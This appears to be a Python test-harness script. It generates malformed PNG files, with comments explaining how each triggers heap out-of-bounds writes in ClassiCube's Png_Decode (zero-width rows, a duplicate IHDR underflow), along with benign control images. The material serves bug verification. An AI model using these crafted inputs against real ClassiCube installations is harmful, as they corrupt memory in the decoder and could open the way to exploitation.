#!/usr/bin/env python3
"""Deterministic PNG generators for the ClassiCube Png_Decode ASan harness.
Only Python stdlib. No network. Writes exact bytes to /tmp/cc-harness/inputs.
"""
import struct, zlib, os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "inputs")
os.makedirs(OUT, exist_ok=True)
SIG = b"\x89PNG\r\n\x1a\n"

def chunk(cc, data):
    return struct.pack(">I", len(data)) + cc + data + struct.pack(">I", zlib.crc32(cc + data) & 0xffffffff)

def ihdr(w, h, bpp=8, ctype=6):
    return struct.pack(">IIBBBBB", w, h, bpp, ctype, 0, 0, 0)

def write(name, blob):
    p = os.path.join(OUT, name)
    with open(p, "wb") as f:
        f.write(blob)
    print(name, len(blob), __import__("hashlib").sha256(blob).hexdigest())

# ------------------------------------------------------------------
# (a) zero-width PNG: width=0, height=2, RGBA, AVERAGE filter on row 1.
# scanlineBytes = 0 + 1 = 1; data alloc = height * max(1, 0) = 2 bytes.
# Row 1 Png_Reconstruct(AVERAGE) first loop writes line[0..3] at &data[2] -> OOB.
# ------------------------------------------------------------------
zw_rows = bytes([0, 3])           # row0 filter NONE, row1 filter AVERAGE
write("zero_width_avg.png", SIG + chunk(b"IHDR", ihdr(0, 2)) + chunk(b"IDAT", zlib.compress(zw_rows)) + chunk(b"IEND", b""))

# variant: PAETH on row 1
zw_rows_p = bytes([0, 4])
write("zero_width_paeth.png", SIG + chunk(b"IHDR", ihdr(0, 2)) + chunk(b"IDAT", zlib.compress(zw_rows_p)) + chunk(b"IEND", b""))

# ------------------------------------------------------------------
# (b) duplicate IHDR: large-then-small dims with a partial first IDAT.
# IHDR1: w=100,h=100,RGBA -> scanlineBytes1=401, bufferLen1=40100.
# IDAT1: first half of a single zlib stream, yields 1000 decompressed bytes
#        (non-final deflate block) -> bufferIdx=1000, rowY=2, available=198.
# IHDR2: w=1,h=3,RGBA -> scanlineBytes2=5, bufferLen2=15, data realloc 15 bytes.
#        bufferIdx is NOT reset -> left = 15 - 1000 underflows to 4294966311.
# IDAT2: remainder of the same zlib stream -> inflate writes at &data[1000] -> OOB.
# ------------------------------------------------------------------
co = zlib.compressobj(level=6)
# SYNC_FLUSH forces part1 to carry 1000 real deflate output bytes while
# deliberately leaving the zlib stream unfinished (no final block / adler32).
part1 = co.compress(bytes([0]) * 1000) + co.flush(zlib.Z_SYNC_FLUSH)
part2 = co.compress(bytes([0]) * 64) + co.flush(zlib.Z_FINISH)
assert len(zlib.decompressobj().decompress(part1)) == 1000
assert zlib.decompress(part1 + part2) == bytes([0]) * 1064
dup = (SIG
       + chunk(b"IHDR", ihdr(100, 100))
       + chunk(b"IDAT", part1)
       + chunk(b"IHDR", ihdr(1, 3))
       + chunk(b"IDAT", part2)
       + chunk(b"IEND", b""))
write("dup_ihdr_underflow.png", dup)

# ------------------------------------------------------------------
# negative control: benign valid 4x2 RGBA PNG, filter NONE/UP.
# ------------------------------------------------------------------
w, h = 4, 2
rows = b""
for y in range(h):
    f = 0 if y == 0 else 2
    rows += bytes([f]) + bytes([ (x*17+y*3)&0xff for x in range(w*4) ])
write("benign.png", SIG + chunk(b"IHDR", ihdr(w, h)) + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b""))

# ------------------------------------------------------------------
# negatives that isolate the preconditions
# ------------------------------------------------------------------
# valid nonzero-width image using AVERAGE + PAETH filters: clean on both builds
fw, fh = 4, 3
frows = bytes([0]) + bytes([ (x*11)&0xff for x in range(fw*4) ])
frows += bytes([3]) + bytes([ (x*7+1)&0xff for x in range(fw*4) ])  # AVERAGE
frows += bytes([4]) + bytes([ (x*5+2)&0xff for x in range(fw*4) ])  # PAETH
write("benign_avg_paeth.png", SIG + chunk(b"IHDR", ihdr(fw, fh)) + chunk(b"IDAT", zlib.compress(frows)) + chunk(b"IEND", b""))

# width=0 but height=1 only: no second row, so Png_Reconstruct is never called
write("zero_width_h1.png", SIG + chunk(b"IHDR", ihdr(0, 1)) + chunk(b"IDAT", zlib.compress(bytes([3]))) + chunk(b"IEND", b""))
